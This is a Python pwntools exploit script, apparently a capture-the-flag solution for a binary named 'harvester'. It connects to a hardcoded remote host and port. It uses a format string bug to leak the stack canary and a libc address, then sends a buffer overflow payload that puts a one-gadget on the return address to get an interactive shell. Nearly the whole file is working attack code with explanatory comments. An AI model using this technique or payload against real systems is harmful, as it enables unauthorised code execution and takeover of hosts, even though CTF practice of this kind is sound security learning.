#!/usr/bin/env python3
#A binary with full protections enabled..Full Relro,NX,Stack Canary and also the ASLR on server....
#The bugs present in binary are very small input that has a format string the size of input is so short..
#That we cannot use it to perform memory overwrite....But only a memory read..
#And finally a buffer overflow in order to suceed in overflowing the buffer and take control instruction pointer..
#We have to leak the stack canary and a libc leak..So Idea is to leak canary and libc address and then proceed to buffer overflow
#So the stack canary is being defeated and then to system '/bin/sh'....
#Haha not so soon guys..I forgot to mention about the buffer overflow with just 24 bytes one for stack canary other for
#base pointer and finally the last 8 bytes of return address...
#Maybe a system('/bin/sh') won't work but a one gadget might so let's return to a one gadget to pop a shell....


from pwn import *
import time

e = ELF("./harvester")
libc = ELF("./libc.so.6")               #If want to try locally change the libc file to your libc file 
#r = process("./harvester")              #uncomment this if u want to try locally
r = remote("46.101.23.157",31735)
canary_leak = b'1\n' + b'%11$p'          #Format string bug to leak the stack Canary 
r.send(canary_leak)
libc_start_main_leak = b'1\n' + b'%21$p'  #Format string bug to leak a libc address
r.recvuntil(b"Choose weapon:")
r.recvuntil(b'Your choice is:')
stack_canary = int(r.recvuntil(b'00'),16)  
r.send(libc_start_main_leak)
r.recvuntil(b"Choose weapon:")
r.recvuntil(b"Your choice is:")
libc_start_main = int((r.recvline().lstrip()[:14]),16) - 231 #Minus 231 to get the libc start main address   
libc_base = libc_start_main - libc.sym["__libc_start_main"]  #Calculation to get libc base address
log.info("The libc base address is found from format string leak is " + hex(libc_base))
one_gadget = libc_base + 0x4f3d5
log.info("The one gadget libc address found from format string leak is " + hex(one_gadget))
exploit = b'2\n' + b'y\n' + b'-11\n' + b'3\n'   #Step need to perform to make  the bof vulnerable read
r.send(exploit)
time.sleep(0.4)
exploit = b'A' * 40 + p64(stack_canary) + p64(0) + p64(one_gadget) #Payload with 40 A's and stack canary and one gadget address to shell
r.send(exploit)
r.interactive()                         #Shelll!!!!!!Finally!!!!!!!!!
r.close()
